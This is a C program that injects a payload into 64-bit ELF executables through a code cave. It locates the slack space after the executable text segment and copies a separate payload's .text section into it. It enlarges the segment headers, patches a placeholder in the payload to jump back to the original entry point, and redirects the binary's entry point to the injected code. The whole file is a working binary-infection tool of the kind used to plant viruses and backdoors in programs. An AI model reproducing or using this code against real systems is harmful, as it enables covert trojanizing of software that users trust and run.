#include<stdio.h>
#include<string.h>
#include<errno.h>
#include<elf.h>
#include<unistd.h>
#include<stdlib.h>
#include<sys/mman.h>
#include<sys/stat.h>
#include<fcntl.h>

//return pattern to look out for in the payload.s file
//#define RET_PATTERN 0xfffffffc
#define RET_PATTERN 0x11111111

struct file_info
{
	uint64_t cave[2];
	uint64_t next_seg[2];
	uint64_t text_seg[2];
	uint64_t ep;
	uint64_t payload_size;
} file;

/*open and map files into memory*/
uint8_t * open_map_file(int *fd,char *filename)
{
	struct stat st;

	/*open file into memory*/
	if((*fd = open(filename,O_RDWR))<0)
	{
		perror("open():");
		exit(EXIT_FAILURE);
	}

	/*get file size*/
	if(fstat(*fd,&st)<0)
	{
		perror("fstat():");
		exit(EXIT_FAILURE);
	}

	/*map into memory*/
	uint8_t *mem = mmap(NULL,st.st_size,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_SHARED,*fd,0);
	if(mem==MAP_FAILED)
	{
		perror("mmap");
		exit(EXIT_FAILURE);
	}

	return mem;
}
/*Get the information such as offset positions, cave size, offset etc.*/
void file_recon(Elf64_Phdr *phdr,int no_segs)
{

	/*Iterate through and print relevant information*/
	for(int i=0;i<=no_segs;i++)
	{
		/*if segment is loadable and has flags containing Exec, then found .text section*/
		if(phdr[i].p_type==PT_LOAD && phdr[i].p_flags==5)
		{
	
			/*[0] contains the offset address, [1] contains the size of the segment*/
			file.text_seg[0] = phdr[i].p_vaddr; file.text_seg[1] = phdr[i].p_memsz;
			file.next_seg[0] = phdr[i+1].p_vaddr; file.next_seg[1] = phdr[i+1].p_memsz;
			
			/*save cave info, [0] for offset address and [1] for size*/
			file.cave[0] = file.text_seg[0] + file.text_seg[1];
			file.cave[1] = file.next_seg[0] - file.cave[0];
			break;

		}
	}
}

/*extract the text section from the payload.s file*/
Elf64_Shdr extract_payload(char *filename,uint8_t *mem)
{
	Elf64_Shdr payload_section;
	Elf64_Ehdr *ehdr; Elf64_Shdr *shdr;

	/*get required data structures*/
	ehdr = (Elf64_Ehdr *)mem; shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];

	char *StringTable,*interp;
	StringTable = &mem[shdr[ehdr->e_shstrndx].sh_offset];

	for(int i=0;i<=ehdr->e_shnum;i++)
	{
		if(strcmp(&StringTable[shdr[i].sh_name],".text")==0)
		{
			payload_section = shdr[i];
			break;
		}
	}
	return payload_section;
}

/*insert the extracted payload into the code cave*/
void insert_payload(Elf64_Shdr payload,int no_segs,Elf64_Phdr *phdr,Elf64_Ehdr *ehdr,uint8_t *mem,uint8_t *payload_data)
{
	/*find .text segment*/
	for(int i=0;i<=no_segs;i++)
	{
		if(phdr[i].p_type==PT_LOAD && phdr[i].p_flags == 5)
		{

			/*increase the size of text segment to accomadate the payload*/
			phdr[i].p_memsz += (file.payload_size);
			phdr[i].p_filesz += (file.payload_size);
		
			

			/*move the payload at the end of the segment(start of code cave)*/
			memmove(mem+file.cave[0],payload_data + payload.sh_offset,payload.sh_size);


			/*patch return address*/
			unsigned char *ptr;
			long data;
			int y,r;
			
			/*pointer to code*/
			ptr = (unsigned char *)mem+file.cave[0];
	
			for(y=0;y<(int)file.payload_size;y++)
			{
				/*get value under pointer pluss offset*/
				data = *((long*)(ptr+y));
				r = data ^(long)RET_PATTERN;

				/*check matching pattern*/
				if(r==0)
				{
					printf("*return address found*\n");
					printf("+ Pattern %1x found at offset %d -> %1x\n",RET_PATTERN,y,file.ep);
					*((long *)(ptr+y)) = file.ep; //set jmp instruction of payload to original entry point 
					break;
				}
			}			
				ehdr->e_entry = file.cave[0]; //set entry point to the code cave
			//	ehdr->e_entry = file.ep;
		       	break;	
		}
	}	
}


int main(int argc,char **argv)
{
	int fd; int fd2;
	Elf64_Ehdr *ehdr; Elf64_Phdr *phdr; Elf64_Shdr *shdr;

	/*1. Extract the payload from payload.s*/
	printf("extracting payload...\n");
	uint8_t *payload_data = open_map_file(&fd2,argv[2]);
	Elf64_Shdr payload = extract_payload(argv[2],payload_data);
	file.payload_size = payload.sh_size;	
	
	/*open target file*/
	uint8_t *mem = open_map_file(&fd,argv[1]);
	
	/*get required data structures*/
	ehdr = (Elf64_Ehdr *)mem; phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff]; shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];

	/*get file information and get program entry point*/
	file_recon(phdr,ehdr->e_phnum);
	file.ep = ehdr->e_entry;

	/*print file information*/
	printf("current segment:");
	printf("address=%d bytes , size=%d bytes \n",file.text_seg[0],file.text_seg[1]);
	printf("\nNext segment:");
	printf("address=%d bytes , size=%d bytes \n",file.next_seg[0],file.next_seg[1]);
	printf("\nCave:");
	printf("address=%d bytes , size=%d bytes \n",file.cave[0],file.cave[1]);

	printf("Program entry point = %d\n",file.ep);


	printf("size of payload = %d\n",payload.sh_size);
	printf("file.payload_size=%d\n",file.payload_size);


	printf("code cave offset = %d\n",file.cave[0]);

	/*2. Insert payload*/
	insert_payload(payload,ehdr->e_phnum,phdr,ehdr,mem,payload_data);

	//close the fds
	close(fd); close(fd2);

}
